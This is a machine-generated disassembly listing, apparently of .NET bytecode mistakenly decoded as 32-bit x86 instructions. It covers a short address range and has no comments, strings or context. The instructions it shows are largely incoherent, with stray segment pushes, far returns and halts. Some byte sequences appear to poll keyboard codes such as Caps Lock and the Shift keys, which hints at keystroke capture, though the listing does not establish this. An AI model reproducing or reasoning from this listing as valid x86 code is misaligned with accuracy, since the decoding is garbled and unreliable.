  4041f2:	6f                   	outsl  %ds:(%esi),(%dx)
  4041f3:	30 00                	xor    %al,(%eax)
  4041f5:	00 0a                	add    %cl,(%edx)
  4041f7:	dc 2b                	fsubrl (%ebx)
  4041f9:	07                   	pop    %es
  4041fa:	02 28                	add    (%eax),%ch
  4041fc:	8a 00                	mov    (%eax),%al
  4041fe:	00 0a                	add    %cl,(%edx)
  404200:	26 2a 00             	sub    %es:(%eax),%al
  404203:	00 01                	add    %al,(%ecx)
  404205:	1c 00                	sbb    $0x0,%al
  404207:	00 00                	add    %al,(%eax)
  404209:	00 06                	add    %al,(%esi)
  40420b:	00 1c 22             	add    %bl,(%edx,%eiz,1)
  40420e:	00 0c 26             	add    %cl,(%esi,%eiz,1)
  404211:	00 00                	add    %al,(%eax)
  404213:	01 02                	add    %eax,(%edx)
  404215:	00 80 00 02 82 00    	add    %al,0x820200(%eax)
  40421b:	0a 00                	or     (%eax),%al
  40421d:	00 00                	add    %al,(%eax)
  40421f:	00 1b                	add    %bl,(%ebx)
  404221:	30 05 00 40 00 00    	xor    %al,0x4000
  404227:	00 24 00             	add    %ah,(%eax,%eax,1)
  40422a:	00 11                	add    %dl,(%ecx)
  40422c:	16                   	push   %ss
  40422d:	0b 14 0c             	or     (%esp,%ecx,1),%edx
  404230:	07                   	pop    %es
  404231:	b5 1f                	mov    $0x1f,%ch
  404233:	64 28 c7             	fs sub %al,%bh
  404236:	00 00                	add    %al,(%eax)
  404238:	0a 13                	or     (%ebx),%dl
  40423a:	04 12                	add    $0x12,%al
  40423c:	04 1f                	add    $0x1f,%al
  40423e:	64 12 02             	adc    %fs:(%edx),%al
  404241:	1f                   	pop    %ds
  404242:	64 28 37             	sub    %dh,%fs:(%edi)
  404245:	00 00                	add    %al,(%eax)
  404247:	06                   	push   %es
  404248:	2c 04                	sub    $0x4,%al
  40424a:	17                   	pop    %ss
  40424b:	0a de                	or     %dh,%bl
  40424d:	1c 07                	sbb    $0x7,%al
  40424f:	17                   	pop    %ss
  404250:	d6                   	salc
  404251:	0b 07                	or     (%edi),%eax
  404253:	1a 31                	sbb    (%ecx),%dh
  404255:	d8 de                	fcomp  %st(6)
  404257:	0e                   	push   %cs
  404258:	25 28 23 00 00       	and    $0x2328,%eax
  40425d:	0a 0d 28 25 00 00    	or     0x2528,%cl
  404263:	0a de                	or     %dh,%bl
  404265:	00 16                	add    %dl,(%esi)
  404267:	0a 2b                	or     (%ebx),%ch
  404269:	00 06                	add    %al,(%esi)
  40426b:	2a 01                	sub    (%ecx),%al
  40426d:	10 00                	adc    %al,(%eax)
  40426f:	00 00                	add    %al,(%eax)
  404271:	00 00                	add    %al,(%eax)
  404273:	00 2c 2c             	add    %ch,(%esp,%ebp,1)
  404276:	00 0e                	add    %cl,(%esi)
  404278:	26 00 00             	add    %al,%es:(%eax)
  40427b:	01 13                	add    %edx,(%ebx)
  40427d:	30 09                	xor    %cl,(%ecx)
  40427f:	00 c8                	add    %cl,%al
  404281:	00 00                	add    %al,(%eax)
  404283:	00 25 00 00 11 28    	add    %ah,0x28110000
  404289:	87 00                	xchg   %eax,(%eax)
  40428b:	00 0a                	add    %cl,(%edx)
  40428d:	1c 28                	sbb    $0x28,%al
  40428f:	56                   	push   %esi
  404290:	00 00                	add    %al,(%eax)
  404292:	06                   	push   %es
  404293:	02 28                	add    (%eax),%ch
  404295:	1e                   	push   %ds
  404296:	00 00                	add    %al,(%eax)
  404298:	0a 28                	or     (%eax),%ch
  40429a:	88 00                	mov    %al,(%eax)
  40429c:	00 0a                	add    %cl,(%edx)
  40429e:	0a 06                	or     (%esi),%al
  4042a0:	28 22                	sub    %ah,(%edx)
  4042a2:	00 00                	add    %al,(%eax)
  4042a4:	0a 03                	or     (%ebx),%al
  4042a6:	28 c8                	sub    %cl,%al
  4042a8:	00 00                	add    %al,(%eax)
  4042aa:	0a 20                	or     (%eax),%ah
  4042ac:	f4                   	hlt
  4042ad:	01 00                	add    %eax,(%eax)
  4042af:	00 28                	add    %ch,(%eax)
  4042b1:	21 00                	and    %eax,(%eax)
  4042b3:	00 0a                	add    %cl,(%edx)
  4042b5:	02 6f bc             	add    -0x44(%edi),%ch
  4042b8:	00 00                	add    %al,(%eax)
  4042ba:	0a 72 52             	or     0x52(%edx),%dh
  4042bd:	07                   	pop    %es
  4042be:	00 70 6f             	add    %dh,0x6f(%eax)
  4042c1:	c9                   	leave
  4042c2:	00 00                	add    %al,(%eax)
  4042c4:	0a 2c 3b             	or     (%ebx,%edi,1),%ch
  4042c7:	72 5c                	jb     0x404325
  4042c9:	07                   	pop    %es
  4042ca:	00 70 73             	add    %dh,0x73(%eax)
  4042cd:	ca 00 00             	lret   $0x0
  4042d0:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  4042d3:	17                   	pop    %ss
  4042d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4042d5:	cb                   	lret
  4042d6:	00 00                	add    %al,(%eax)
  4042d8:	0a 08                	or     (%eax),%cl
  4042da:	72 7a                	jb     0x404356
  4042dc:	07                   	pop    %es
  4042dd:	00 70 06             	add    %dh,0x6(%eax)
  4042e0:	28 63 00             	sub    %ah,0x0(%ebx)
  4042e3:	00 0a                	add    %cl,(%edx)
  4042e5:	72 ba                	jb     0x4042a1
  4042e7:	07                   	pop    %es
  4042e8:	00 70 28             	add    %dh,0x28(%eax)
  4042eb:	63 00                	arpl   %eax,(%eax)
  4042ed:	00 0a                	add    %cl,(%edx)
  4042ef:	28 22                	sub    %ah,(%edx)
  4042f1:	00 00                	add    %al,(%eax)
  4042f3:	0a 6f cc             	or     -0x34(%edi),%ch
  4042f6:	00 00                	add    %al,(%eax)
  4042f8:	0a 08                	or     (%eax),%cl
  4042fa:	28 cd                	sub    %cl,%ch
  4042fc:	00 00                	add    %al,(%eax)
  4042fe:	0a 0b                	or     (%ebx),%cl
  404300:	2b 4d 14             	sub    0x14(%ebp),%ecx
  404303:	d0 5f 00             	rcrb   $1,0x0(%edi)
  404306:	00 01                	add    %al,(%ecx)
  404308:	28 14 00             	sub    %dl,(%eax,%eax,1)
  40430b:	00 0a                	add    %cl,(%edx)
  40430d:	72 76                	jb     0x404385
  40430f:	03 00                	add    (%eax),%eax
  404311:	70 17                	jo     0x40432a
  404313:	8d 03                	lea    (%ebx),%eax
  404315:	00 00                	add    %al,(%eax)
  404317:	01 0d 09 16 06 28    	add    %ecx,0x28061609
  40431d:	11 00                	adc    %eax,(%eax)
  40431f:	00 0a                	add    %cl,(%edx)
  404321:	a2 09 13 04 11       	mov    %al,0x11041309
  404326:	04 14                	add    $0x14,%al
  404328:	14 17                	adc    $0x17,%al
  40432a:	8d 3b                	lea    (%ebx),%edi
  40432c:	00 00                	add    %al,(%eax)
  40432e:	01 13                	add    %edx,(%ebx)
  404330:	05 11 05 16 17       	add    $0x17160511,%eax
  404335:	9c                   	pushf
  404336:	11 05 17 28 75 00    	adc    %eax,0x752817
  40433c:	00 0a                	add    %cl,(%edx)
  40433e:	26 11 05 16 90 2c 0a 	adc    %eax,%es:0xa2c9016
  404345:	11 04 16             	adc    %eax,(%esi,%edx,1)
  404348:	9a 28 11 00 00 0a 0a 	lcall  $0xa0a,$0x1128
  40434f:	2a 1b                	sub    (%ebx),%bl
  404351:	30 03                	xor    %al,(%ebx)
  404353:	00 5d 00             	add    %bl,0x0(%ebp)
  404356:	00 00                	add    %al,(%eax)
  404358:	26 00 00             	add    %al,%es:(%eax)
  40435b:	11 28                	adc    %ebp,(%eax)
  40435d:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40435e:	00 00                	add    %al,(%eax)
  404360:	0a 02                	or     (%edx),%al
  404362:	6f                   	outsl  %ds:(%esi),(%dx)
  404363:	a8 00                	test   $0x0,%al
  404365:	00 0a                	add    %cl,(%edx)
  404367:	0b 07                	or     (%edi),%eax
  404369:	6f                   	outsl  %ds:(%esi),(%dx)
  40436a:	ce                   	into
  40436b:	00 00                	add    %al,(%eax)
  40436d:	0a 0d 07 09 6f aa    	or     0xaa6f0907,%cl
  404373:	00 00                	add    %al,(%eax)
  404375:	0a 6f cf             	or     -0x31(%edi),%ch
  404378:	00 00                	add    %al,(%eax)
  40437a:	0a 28                	or     (%eax),%ch
  40437c:	11 00                	adc    %eax,(%eax)
  40437e:	00 0a                	add    %cl,(%edx)
  404380:	0c 17                	or     $0x17,%al
  404382:	8d 03                	lea    (%ebx),%eax
  404384:	00 00                	add    %al,(%eax)
  404386:	01 13                	add    %edx,(%ebx)
  404388:	04 09                	add    $0x9,%al
  40438a:	6f                   	outsl  %ds:(%esi),(%dx)
  40438b:	d0 00                	rolb   $1,(%eax)
  40438d:	00 0a                	add    %cl,(%edx)
  40438f:	8e b7 16 33 03 14    	mov    0x14033316(%edi),%?
  404395:	13 04 09             	adc    (%ecx,%ecx,1),%eax
  404398:	08 28                	or     %ch,(%eax)
  40439a:	11 00                	adc    %eax,(%eax)
  40439c:	00 0a                	add    %cl,(%edx)
  40439e:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  4043a1:	d1 00                	roll   $1,(%eax)
  4043a3:	00 0a                	add    %cl,(%edx)
  4043a5:	26 de 0f             	fimuls %es:(%edi)
  4043a8:	25 28 23 00 00       	and    $0x2328,%eax
  4043ad:	0a 13                	or     (%ebx),%dl
  4043af:	05 28 25 00 00       	add    $0x2528,%eax
  4043b4:	0a de                	or     %dh,%bl
  4043b6:	00 06                	add    %al,(%esi)
  4043b8:	2a 00                	sub    (%eax),%al
  4043ba:	00 00                	add    %al,(%eax)
  4043bc:	01 10                	add    %edx,(%eax)
  4043be:	00 00                	add    %al,(%eax)
  4043c0:	00 00                	add    %al,(%eax)
  4043c2:	00 00                	add    %al,(%eax)
  4043c4:	4c                   	dec    %esp
  4043c5:	4c                   	dec    %esp
  4043c6:	00 0f                	add    %cl,(%edi)
  4043c8:	26 00 00             	add    %al,%es:(%eax)
  4043cb:	01 3a                	add    %edi,(%edx)
  4043cd:	02 28                	add    (%eax),%ch
  4043cf:	22 00                	and    (%eax),%al
  4043d1:	00 0a                	add    %cl,(%edx)
  4043d3:	28 33                	sub    %dh,(%ebx)
  4043d5:	00 00                	add    %al,(%eax)
  4043d7:	06                   	push   %es
  4043d8:	2b 00                	sub    (%eax),%eax
  4043da:	2a 00                	sub    (%eax),%al
  4043dc:	3a 02                	cmp    (%edx),%al
  4043de:	28 22                	sub    %ah,(%edx)
  4043e0:	00 00                	add    %al,(%eax)
  4043e2:	0a 28                	or     (%eax),%ch
  4043e4:	34 00                	xor    $0x0,%al
  4043e6:	00 06                	add    %al,(%esi)
  4043e8:	2b 00                	sub    (%eax),%eax
  4043ea:	2a 00                	sub    (%eax),%al
  4043ec:	1b 30                	sbb    (%eax),%esi
  4043ee:	05 00 aa 00 00       	add    $0xaa00,%eax
  4043f3:	00 27                	add    %ah,(%edi)
  4043f5:	00 00                	add    %al,(%eax)
  4043f7:	11 18                	adc    %ebx,(%eax)
  4043f9:	17                   	pop    %ss
  4043fa:	1c 73                	sbb    $0x73,%al
  4043fc:	36 00 00             	add    %al,%ss:(%eax)
  4043ff:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  404402:	02 7b 37             	add    0x37(%ebx),%bh
  404405:	00 00                	add    %al,(%eax)
  404407:	04 02                	add    $0x2,%al
  404409:	7b 38                	jnp    0x404443
  40440b:	00 00                	add    %al,(%eax)
  40440d:	04 28                	add    $0x28,%al
  40440f:	ae                   	scas   %es:(%edi),%al
  404410:	00 00                	add    %al,(%eax)
  404412:	0a 6f 3b             	or     0x3b(%edi),%ch
  404415:	00 00                	add    %al,(%eax)
  404417:	0a 1b                	or     (%ebx),%bl
  404419:	8d 23                	lea    (%ebx),%esp
  40441b:	00 00                	add    %al,(%eax)
  40441d:	01 13                	add    %edx,(%ebx)
  40441f:	04 11                	add    $0x11,%al
  404421:	04 16                	add    $0x16,%al
  404423:	72 be                	jb     0x4043e3
  404425:	07                   	pop    %es
  404426:	00 70 a2             	add    %dh,-0x5e(%eax)
  404429:	11 04 17             	adc    %eax,(%edi,%edx,1)
  40442c:	02 7b 37             	add    0x37(%ebx),%bh
  40442f:	00 00                	add    %al,(%eax)
  404431:	04 a2                	add    $0xa2,%al
  404433:	11 04 18             	adc    %eax,(%eax,%ebx,1)
  404436:	72 ee                	jb     0x404426
  404438:	07                   	pop    %es
  404439:	00 70 a2             	add    %dh,-0x5e(%eax)
  40443c:	11 04 19             	adc    %eax,(%ecx,%ebx,1)
  40443f:	7e 2f                	jle    0x404470
  404441:	00 00                	add    %al,(%eax)
  404443:	04 73                	add    $0x73,%al
  404445:	31 00                	xor    %eax,(%eax)
  404447:	00 0a                	add    %cl,(%edx)
  404449:	7e 2f                	jle    0x40447a
  40444b:	00 00                	add    %al,(%eax)
  40444d:	04 8e                	add    $0x8e,%al
  40444f:	b7 6f                	mov    $0x6f,%bh
  404451:	c1 00 00             	roll   $0x0,(%eax)
  404454:	0a 9a a2 11 04 1a    	or     0x1a0411a2(%edx),%bl
  40445a:	72 9f                	jb     0x4043fb
  40445c:	08 00                	or     %al,(%eax)
  40445e:	70 a2                	jo     0x404402
  404460:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  404463:	82 00 00             	addb   $0x0,(%eax)
  404466:	0a 0b                	or     (%ebx),%cl
  404468:	28 d2                	sub    %dl,%dl
  40446a:	00 00                	add    %al,(%eax)
  40446c:	0a 07                	or     (%edi),%al
  40446e:	6f                   	outsl  %ds:(%esi),(%dx)
  40446f:	d3 00                	roll   %cl,(%eax)
  404471:	00 0a                	add    %cl,(%edx)
  404473:	0a 08                	or     (%eax),%cl
  404475:	06                   	push   %es
  404476:	16                   	push   %ss
  404477:	06                   	push   %es
  404478:	8e b7 16 6f d4 00    	mov    0xd46f16(%edi),%?
  40447e:	00 0a                	add    %cl,(%edx)
  404480:	26 20 c4             	es and %al,%ah
  404483:	09 00                	or     %eax,(%eax)
  404485:	00 28                	add    %ch,(%eax)
  404487:	21 00                	and    %eax,(%eax)
  404489:	00 0a                	add    %cl,(%edx)
  40448b:	08 6f 80             	or     %ch,-0x80(%edi)
  40448e:	00 00                	add    %al,(%eax)
  404490:	0a de                	or     %dh,%bl
  404492:	0e                   	push   %cs
  404493:	25 28 23 00 00       	and    $0x2328,%eax
  404498:	0a 0d 28 25 00 00    	or     0x2528,%cl
  40449e:	0a de                	or     %dh,%bl
  4044a0:	00 2a                	add    %ch,(%edx)
  4044a2:	00 00                	add    %al,(%eax)
  4044a4:	01 10                	add    %edx,(%eax)
  4044a6:	00 00                	add    %al,(%eax)
  4044a8:	00 00                	add    %al,(%eax)
  4044aa:	00 00                	add    %al,(%eax)
  4044ac:	9b                   	fwait
  4044ad:	9b                   	fwait
  4044ae:	00 0e                	add    %cl,(%esi)
  4044b0:	26 00 00             	add    %al,%es:(%eax)
  4044b3:	01 1e                	add    %ebx,(%esi)
  4044b5:	02 28                	add    (%eax),%ch
  4044b7:	17                   	pop    %ss
  4044b8:	00 00                	add    %al,(%eax)
  4044ba:	0a 2a                	or     (%edx),%ch
  4044bc:	1e                   	push   %ds
  4044bd:	02 28                	add    (%eax),%ch
  4044bf:	17                   	pop    %ss
  4044c0:	00 00                	add    %al,(%eax)
  4044c2:	0a 2a                	or     (%edx),%ch
  4044c4:	1b 30                	sbb    (%eax),%esi
  4044c6:	04 00                	add    $0x0,%al
  4044c8:	35 01 00 00 28       	xor    $0x28000001,%eax
  4044cd:	00 00                	add    %al,(%eax)
  4044cf:	11 02                	adc    %eax,(%edx)
  4044d1:	2c 2f                	sub    $0x2f,%al
  4044d3:	28 87 00 00 0a 1c    	sub    %al,0x1c0a0000(%edi)
  4044d9:	28 56 00             	sub    %dl,0x0(%esi)
  4044dc:	00 06                	add    %al,(%esi)
  4044de:	03 28                	add    (%eax),%ebp
  4044e0:	1e                   	push   %ds
  4044e1:	00 00                	add    %al,(%eax)
  4044e3:	0a 28                	or     (%eax),%ch
  4044e5:	88 00                	mov    %al,(%eax)
  4044e7:	00 0a                	add    %cl,(%edx)
  4044e9:	10 01                	adc    %al,(%ecx)
  4044eb:	03 04 28             	add    (%eax,%ebp,1),%eax
  4044ee:	c8 00 00 0a          	enter  $0x0,$0xa
  4044f2:	de 0e                	fimuls (%esi)
  4044f4:	25 28 23 00 00       	and    $0x2328,%eax
  4044f9:	0a 0a                	or     (%edx),%cl
  4044fb:	28 25 00 00 0a de    	sub    %ah,0xde0a0000
  404501:	00 28                	add    %ch,(%eax)
  404503:	d7                   	xlat   %ds:(%ebx)
  404504:	00 00                	add    %al,(%eax)
  404506:	0a 72 d5             	or     -0x2b(%edx),%dh
  404509:	08 00                	or     %al,(%eax)
  40450b:	70 28                	jo     0x404535
  40450d:	1e                   	push   %ds
  40450e:	00 00                	add    %al,(%eax)
  404510:	0a 0b                	or     (%ebx),%cl
  404512:	07                   	pop    %es
  404513:	73 d8                	jae    0x4044ed
  404515:	00 00                	add    %al,(%eax)
  404517:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  40451a:	72 df                	jb     0x4044fb
  40451c:	08 00                	or     %al,(%eax)
  40451e:	70 6f                	jo     0x40458f
  404520:	d9 00                	flds   (%eax)
  404522:	00 0a                	add    %cl,(%edx)
  404524:	08 72 f3             	or     %dh,-0xd(%edx)
  404527:	08 00                	or     %al,(%eax)
  404529:	70 6f                	jo     0x40459a
  40452b:	d9 00                	flds   (%eax)
  40452d:	00 0a                	add    %cl,(%edx)
  40452f:	08 72 13             	or     %dh,0x13(%edx)
  404532:	09 00                	or     %eax,(%eax)
  404534:	70 28                	jo     0x40455e
  404536:	da 00                	fiaddl (%eax)
  404538:	00 0a                	add    %cl,(%edx)
  40453a:	28 1e                	sub    %bl,(%esi)
  40453c:	00 00                	add    %al,(%eax)
  40453e:	0a 6f d9             	or     -0x27(%edi),%ch
  404541:	00 00                	add    %al,(%eax)
  404543:	0a 08                	or     (%eax),%cl
  404545:	72 1b                	jb     0x404562
  404547:	09 00                	or     %eax,(%eax)
  404549:	70 28                	jo     0x404573
  40454b:	db 00                	fildl  (%eax)
  40454d:	00 0a                	add    %cl,(%edx)
  40454f:	28 4d 00             	sub    %cl,0x0(%ebp)
  404552:	00 0a                	add    %cl,(%edx)
  404554:	72 27                	jb     0x40457d
  404556:	09 00                	or     %eax,(%eax)
  404558:	70 28                	jo     0x404582
  40455a:	53                   	push   %ebx
  40455b:	00 00                	add    %al,(%eax)
  40455d:	0a 6f d9             	or     -0x27(%edi),%ch
  404560:	00 00                	add    %al,(%eax)
  404562:	0a 08                	or     (%eax),%cl
  404564:	72 13                	jb     0x404579
  404566:	09 00                	or     %eax,(%eax)
  404568:	70 28                	jo     0x404592
  40456a:	87 00                	xchg   %eax,(%eax)
  40456c:	00 0a                	add    %cl,(%edx)
  40456e:	28 1e                	sub    %bl,(%esi)
  404570:	00 00                	add    %al,(%eax)
  404572:	0a 6f d9             	or     -0x27(%edi),%ch
  404575:	00 00                	add    %al,(%eax)
  404577:	0a 08                	or     (%eax),%cl
  404579:	72 1b                	jb     0x404596
  40457b:	09 00                	or     %eax,(%eax)
  40457d:	70 07                	jo     0x404586
  40457f:	28 4d 00             	sub    %cl,0x0(%ebp)
  404582:	00 0a                	add    %cl,(%edx)
  404584:	72 27                	jb     0x4045ad
  404586:	09 00                	or     %eax,(%eax)
  404588:	70 28                	jo     0x4045b2
  40458a:	53                   	push   %ebx
  40458b:	00 00                	add    %al,(%eax)
  40458d:	0a 6f d9             	or     -0x27(%edi),%ch
  404590:	00 00                	add    %al,(%eax)
  404592:	0a de                	or     %dh,%bl
  404594:	0a 08                	or     (%eax),%cl
  404596:	2c 06                	sub    $0x6,%al
  404598:	08 6f 30             	or     %ch,0x30(%edi)
  40459b:	00 00                	add    %al,(%eax)
  40459d:	0a dc                	or     %ah,%bl
  40459f:	02 2c 15 03 28 8a 00 	add    0x8a2803(,%edx,1),%ch
  4045a6:	00 0a                	add    %cl,(%edx)
  4045a8:	26 de 0c 28          	fimuls %es:(%eax,%ebp,1)
  4045ac:	23 00                	and    (%eax),%eax
  4045ae:	00 0a                	add    %cl,(%edx)
  4045b0:	28 25 00 00 0a de    	sub    %ah,0xde0a0000
  4045b6:	00 73 dc             	add    %dh,-0x24(%ebx)
  4045b9:	00 00                	add    %al,(%eax)
  4045bb:	0a 13                	or     (%ebx),%dl
  4045bd:	04 11                	add    $0x11,%al
  4045bf:	04 07                	add    $0x7,%al
  4045c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4045c2:	dd 00                	fldl   (%eax)
  4045c4:	00 0a                	add    %cl,(%edx)
  4045c6:	11 04 17             	adc    %eax,(%edi,%edx,1)
  4045c9:	6f                   	outsl  %ds:(%esi),(%dx)
  4045ca:	de 00                	fiadds (%eax)
  4045cc:	00 0a                	add    %cl,(%edx)
  4045ce:	11 04 16             	adc    %eax,(%esi,%edx,1)
  4045d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4045d2:	df 00                	filds  (%eax)
  4045d4:	00 0a                	add    %cl,(%edx)
  4045d6:	11 04 16             	adc    %eax,(%esi,%edx,1)
  4045d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4045da:	e0 00                	loopne 0x4045dc
  4045dc:	00 0a                	add    %cl,(%edx)
  4045de:	11 04 17             	adc    %eax,(%edi,%edx,1)
  4045e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4045e2:	cb                   	lret
  4045e3:	00 00                	add    %al,(%eax)
  4045e5:	0a 11                	or     (%ecx),%dl
  4045e7:	04 28                	add    $0x28,%al
  4045e9:	cd 00                	int    $0x0
  4045eb:	00 0a                	add    %cl,(%edx)
  4045ed:	26 16                	es push %ss
  4045ef:	28 24 00             	sub    %ah,(%eax,%eax,1)
  4045f2:	00 0a                	add    %cl,(%edx)
  4045f4:	de 0e                	fimuls (%esi)
  4045f6:	25 28 23 00 00       	and    $0x2328,%eax
  4045fb:	0a 0d 28 25 00 00    	or     0x2528,%cl
  404601:	0a de                	or     %dh,%bl
  404603:	00 2a                	add    %ch,(%edx)
  404605:	00 00                	add    %al,(%eax)
  404607:	00 01                	add    %al,(%ecx)
  404609:	34 00                	xor    $0x0,%al
  40460b:	00 00                	add    %al,(%eax)
  40460d:	00 03                	add    %al,(%ebx)
  40460f:	00 21                	add    %ah,(%ecx)
  404611:	24 00                	and    $0x0,%al
  404613:	0e                   	push   %cs
  404614:	26 00 00             	add    %al,%es:(%eax)
  404617:	01 02                	add    %eax,(%edx)
  404619:	00 49 00             	add    %cl,0x0(%ecx)
  40461c:	7c c5                	jl     0x4045e3
  40461e:	00 0a                	add    %cl,(%edx)
  404620:	00 00                	add    %al,(%eax)
  404622:	00 00                	add    %al,(%eax)
  404624:	00 00                	add    %al,(%eax)
  404626:	d2 00                	rolb   %cl,(%eax)
  404628:	09 db                	or     %ebx,%ebx
  40462a:	00 0c 26             	add    %cl,(%esi,%eiz,1)
  40462d:	00 00                	add    %al,(%eax)
  40462f:	01 00                	add    %eax,(%eax)
  404631:	00 32                	add    %dh,(%edx)
  404633:	00 f4                	add    %dh,%ah
  404635:	26 01 0e             	add    %ecx,%es:(%esi)
  404638:	26 00 00             	add    %al,%es:(%eax)
  40463b:	01 8e 14 fe 06 43    	add    %ecx,0x4306fe14(%esi)
  404641:	00 00                	add    %al,(%eax)
  404643:	06                   	push   %es
  404644:	73 6b                	jae    0x4046b1
  404646:	00 00                	add    %al,(%eax)
  404648:	06                   	push   %es
  404649:	80 22 00             	andb   $0x0,(%edx)
  40464c:	00 04 7e             	add    %al,(%esi,%edi,2)
  40464f:	e1 00                	loope  0x404651
  404651:	00 0a                	add    %cl,(%edx)
  404653:	80 23 00             	andb   $0x0,(%ebx)
  404656:	00 04 1f             	add    %al,(%edi,%ebx,1)
  404659:	0d 80 24 00 00       	or     $0x2480,%eax
  40465e:	04 2a                	add    $0x2a,%al
  404660:	1e                   	push   %ds
  404661:	02 28                	add    (%eax),%ch
  404663:	17                   	pop    %ss
  404664:	00 00                	add    %al,(%eax)
  404666:	0a 2a                	or     (%edx),%ch
  404668:	56                   	push   %esi
  404669:	7e 22                	jle    0x40468d
  40466b:	00 00                	add    %al,(%eax)
  40466d:	04 28                	add    $0x28,%al
  40466f:	42                   	inc    %edx
  404670:	00 00                	add    %al,(%eax)
  404672:	06                   	push   %es
  404673:	80 23 00             	andb   $0x0,(%ebx)
  404676:	00 04 28             	add    %al,(%eax,%ebp,1)
  404679:	e2 00                	loop   0x40467b
  40467b:	00 0a                	add    %cl,(%edx)
  40467d:	2a 00                	sub    (%eax),%al
  40467f:	00 1b                	add    %bl,(%ebx)
  404681:	30 04 00             	xor    %al,(%eax,%eax,1)
  404684:	2e 00 00             	add    %al,%cs:(%eax)
  404687:	00 29                	add    %ch,(%ecx)
  404689:	00 00                	add    %al,(%eax)
  40468b:	11 28                	adc    %ebp,(%eax)
  40468d:	e3 00                	jecxz  0x40468f
  40468f:	00 0a                	add    %cl,(%edx)
  404691:	0b 7e 24             	or     0x24(%esi),%edi
  404694:	00 00                	add    %al,(%eax)
  404696:	04 02                	add    $0x2,%al
  404698:	07                   	pop    %es
  404699:	6f                   	outsl  %ds:(%esi),(%dx)
  40469a:	e4 00                	in     $0x0,%al
  40469c:	00 0a                	add    %cl,(%edx)
  40469e:	28 49 00             	sub    %cl,0x0(%ecx)
  4046a1:	00 06                	add    %al,(%esi)
  4046a3:	16                   	push   %ss
  4046a4:	28 46 00             	sub    %al,0x0(%esi)
  4046a7:	00 06                	add    %al,(%esi)
  4046a9:	0a de                	or     %dh,%bl
  4046ab:	0c de                	or     $0xde,%al
  4046ad:	0a 07                	or     (%edi),%al
  4046af:	2c 06                	sub    $0x6,%al
  4046b1:	07                   	pop    %es
  4046b2:	6f                   	outsl  %ds:(%esi),(%dx)
  4046b3:	30 00                	xor    %al,(%eax)
  4046b5:	00 0a                	add    %cl,(%edx)
  4046b7:	dc 06                	faddl  (%esi)
  4046b9:	2a 00                	sub    (%eax),%al
  4046bb:	00 01                	add    %al,(%ecx)
  4046bd:	10 00                	adc    %al,(%eax)
  4046bf:	00 02                	add    %al,(%edx)
  4046c1:	00 06                	add    %al,(%esi)
  4046c3:	00 1c 22             	add    %bl,(%edx,%eiz,1)
  4046c6:	00 0a                	add    %cl,(%edx)
  4046c8:	00 00                	add    %al,(%eax)
  4046ca:	00 00                	add    %al,(%eax)
  4046cc:	1b 30                	sbb    (%eax),%esi
  4046ce:	07                   	pop    %es
  4046cf:	00 d9                	add    %bl,%cl
  4046d1:	02 00                	add    (%eax),%al
  4046d3:	00 2a                	add    %ch,(%edx)
  4046d5:	00 00                	add    %al,(%eax)
  4046d7:	11 02                	adc    %eax,(%edx)
  4046d9:	16                   	push   %ss
  4046da:	3f                   	aas
  4046db:	c0 02 00             	rolb   $0x0,(%edx)
  4046de:	00 03                	add    %al,(%ebx)
  4046e0:	20 00                	and    %al,(%eax)
  4046e2:	01 00                	add    %eax,(%eax)
  4046e4:	00 28                	add    %ch,(%eax)
  4046e6:	e5 00                	in     $0x0,%eax
  4046e8:	00 0a                	add    %cl,(%edx)
  4046ea:	28 e6                	sub    %ah,%dh
  4046ec:	00 00                	add    %al,(%eax)
  4046ee:	0a 39                	or     (%ecx),%bh
  4046f0:	ab                   	stos   %eax,%es:(%edi)
  4046f1:	02 00                	add    (%eax),%al
  4046f3:	00 04 28             	add    %al,(%eax,%ebp,1)
  4046f6:	e7 00                	out    %eax,$0x0
  4046f8:	00 0a                	add    %cl,(%edx)
  4046fa:	8c 6f 00             	mov    %gs,0x0(%edi)
  4046fd:	00 01                	add    %al,(%ecx)
  4046ff:	13 04 1f             	adc    (%edi,%ebx,1),%eax
  404702:	14 28                	adc    $0x28,%al
  404704:	4c                   	dec    %esp
  404705:	00 00                	add    %al,(%eax)
  404707:	06                   	push   %es
  404708:	20 ff                	and    %bh,%bh
  40470a:	ff 00                	incl   (%eax)
  40470c:	00 5f 16             	add    %bl,0x16(%edi)
  40470f:	fe 01                	incb   (%ecx)
  404711:	16                   	push   %ss
  404712:	fe 01                	incb   (%ecx)
  404714:	8c 3b                	mov    %?,(%ebx)
  404716:	00 00                	add    %al,(%eax)
  404718:	01 0b                	add    %ecx,(%ebx)
  40471a:	20 a0 00 00 00 28    	and    %ah,0x28000000(%eax)
  404720:	4c                   	dec    %esp
  404721:	00 00                	add    %al,(%eax)
  404723:	06                   	push   %es
  404724:	20 00                	and    %al,(%eax)
  404726:	80 00 00             	addb   $0x0,(%eax)
  404729:	5f                   	pop    %edi
  40472a:	16                   	push   %ss
  40472b:	33 16                	xor    (%esi),%edx
  40472d:	20 a1 00 00 00 28    	and    %ah,0x28000000(%ecx)
  404733:	4c                   	dec    %esp
  404734:	00 00                	add    %al,(%eax)
  404736:	06                   	push   %es
  404737:	20 00                	and    %al,(%eax)
  404739:	80 00 00             	addb   $0x0,(%eax)
  40473c:	5f                   	pop    %edi
  40473d:	16                   	push   %ss
  40473e:	33 03                	xor    (%ebx),%eax
  404740:	16                   	push   %ss
  404741:	2b 01                	sub    (%ecx),%eax
  404743:	17                   	pop    %ss
  404744:	8c 3b                	mov    %?,(%ebx)
  404746:	00 00                	add    %al,(%eax)
  404748:	01 0d 11 04 28 e8    	add    %ecx,0xe8280411
  40474e:	00 00                	add    %al,(%eax)
  404750:	0a 28                	or     (%eax),%ch
  404752:	44                   	inc    %esp
  404753:	00 00                	add    %al,(%eax)
  404755:	06                   	push   %es
  404756:	0c 07                	or     $0x7,%al
  404758:	28 e9                	sub    %ch,%cl
  40475a:	00 00                	add    %al,(%eax)
  40475c:	0a 2d 10 09 28 e9    	or     0xe9280910,%ch
  404762:	00 00                	add    %al,(%eax)
